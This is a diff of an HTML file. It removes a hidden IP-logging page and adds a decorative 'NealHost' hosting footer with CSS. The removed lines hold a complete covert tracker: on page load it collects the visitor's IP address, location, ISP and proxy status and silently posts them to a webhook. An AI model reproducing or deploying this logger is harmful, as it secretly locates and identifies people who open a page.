@@ -1,79 +1,135 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Not Available</title>
-    <!-- CSS -->
-    <link rel="stylesheet" href="src/css/main.min.css">
-    <!-- Fontawesome -->
-    <link href="https://cdn.staticaly.com/gh/hung1001/font-awesome-pro/4cac1a6/css/all.css" rel="stylesheet" type="text/css" />
-    <!-- Google Fonts -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Lora:wght@700&family=Poppins:wght@300;600&display=swap" rel="stylesheet">
-    <!-- Leaflet -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" integrity="sha512-xodZBNTC5n17Xt2atTPuE1HxjVMSvLVW9ocqUKLsCC5CXdbqCmblAshOMAS6/keqq/sMZMZ19scR4PsZChSR7A==" crossorigin="" />
-    <link rel="icon" type="image/x-icon" href="./src/favicon.ico">
-    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js" integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA==" crossorigin=""></script>
-    <!-- Notyf CSS -->
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css">
-  </head>
-  <body>
-    <header class="header"></header>
-    <script src="./config.js"></script>
-    <script>
-      function get_information(link, callback) {
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", link, true);
-        xhr.onreadystatechange = function() {
-          if (xhr.readyState === 4) {
-            callback(xhr.responseText);
-          }
-        };
-        xhr.send(null);
-      }
-      get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
-        var div = document.createElement("div");
-        div.innerHTML = text;
-        div.id = "razzylog";
-        const secondList = document.getElementsByClassName("header")[0]
-        secondList.appendChild(div)
-      });
-      get_information("https://api.ipify.org/", function(text) {
-        var div = document.createElement("div");
-        div.innerHTML = text;
-        div.id = "ipppp";
-        const secondList = document.getElementsByClassName("header")[0]
-        secondList.appendChild(div)
-      });
+<!-- Google Fonts -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;600;700&family=Ubuntu:wght@400;500;700&display=swap" rel="stylesheet">
 
-      function ipLogByRaz() {
-        var ispp = document.getElementById('ipppp').innerHTML
-        var extra = document.getElementById("razzylog").innerHTML
-        const request = new XMLHttpRequest();
-        request.open("POST", wbhk);
-        request.setRequestHeader('Content-type', 'application/json');
-        const params = {
-          username: "Beamed",
-          avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
-          content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : ```" + extra + "```"
-        }
-        request.send(JSON.stringify(params));
-      }
-      setTimeout(function() {
-        ipLogByRaz()
-      }, 700);
-    </script>
-    <style>
-      .header {
-        display: none
-      }
+<footer class="nealhost-footer">
+  <div class="nealhost-footer__inner">
+    <div class="nealhost-brand">
+      <div class="nealhost-logo-wrap">
+        <img
+          class="nealhost-logo"
+          src="https://upload.wikimedia.org/wikipedia/commons/3/3f/Placeholder_view_vector.svg"
+          alt="NealHost logo"
+        >
+      </div>
+      <div class="nealhost-text">
+        <span class="nealhost-name">NealHost</span>
+        <span class="nealhost-tagline">Hosting rápido, estable y con estilo</span>
+      </div>
+    </div>
+  </div>
+</footer>
 
-      .map-container {
-        display: none
-      }
-    </style>
-  </body>
-</html>
+<style>
+  .nealhost-footer {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 28px 18px 34px;
+    margin-top: 80px;
+    box-sizing: border-box;
+    background:
+      radial-gradient(circle at top, rgba(255, 120, 120, 0.22), transparent 35%),
+      linear-gradient(180deg, #2a0909 0%, #1a0505 55%, #120303 100%);
+    border-top: 1px solid rgba(255, 120, 120, 0.18);
+    font-family: 'Ubuntu', 'Poppins', sans-serif;
+  }
+
+  .nealhost-footer__inner {
+    width: 100%;
+    max-width: 1100px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .nealhost-brand {
+    display: inline-flex;
+    align-items: center;
+    gap: 16px;
+    padding: 16px 24px;
+    border-radius: 22px;
+    background: rgba(255, 255, 255, 0.04);
+    box-shadow:
+      0 10px 30px rgba(0, 0, 0, 0.28),
+      0 0 0 1px rgba(255, 120, 120, 0.14) inset,
+      0 0 28px rgba(255, 70, 70, 0.16);
+    backdrop-filter: blur(10px);
+  }
+
+  .nealhost-logo-wrap {
+    width: 62px;
+    height: 62px;
+    border-radius: 18px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background:
+      linear-gradient(135deg, #ff6b6b 0%, #d61f3d 55%, #7a0918 100%);
+    box-shadow:
+      0 8px 18px rgba(214, 31, 61, 0.38),
+      0 0 0 1px rgba(255, 255, 255, 0.08) inset;
+  }
+
+  .nealhost-logo {
+    width: 34px;
+    height: 34px;
+    object-fit: contain;
+    filter: brightness(0) invert(1);
+  }
+
+  .nealhost-text {
+    display: flex;
+    flex-direction: column;
+    line-height: 1.05;
+  }
+
+  .nealhost-name {
+    font-family: 'Ubuntu', 'Poppins', sans-serif;
+    font-size: 30px;
+    font-weight: 700;
+    letter-spacing: 0.4px;
+    color: #ffd7d7;
+    text-shadow:
+      0 0 10px rgba(255, 110, 110, 0.25),
+      0 0 22px rgba(214, 31, 61, 0.22);
+  }
+
+  .nealhost-tagline {
+    margin-top: 6px;
+    font-family: 'Poppins', 'Ubuntu', sans-serif;
+    font-size: 13px;
+    font-weight: 500;
+    letter-spacing: 0.3px;
+    color: rgba(255, 214, 214, 0.78);
+  }
+
+  @media (max-width: 640px) {
+    .nealhost-brand {
+      gap: 12px;
+      padding: 14px 16px;
+      border-radius: 18px;
+    }
+
+    .nealhost-logo-wrap {
+      width: 52px;
+      height: 52px;
+      border-radius: 15px;
+    }
+
+    .nealhost-logo {
+      width: 28px;
+      height: 28px;
+    }
+
+    .nealhost-name {
+      font-size: 24px;
+    }
+
+    .nealhost-tagline {
+      font-size: 12px;
+    }
+  }
+</style>
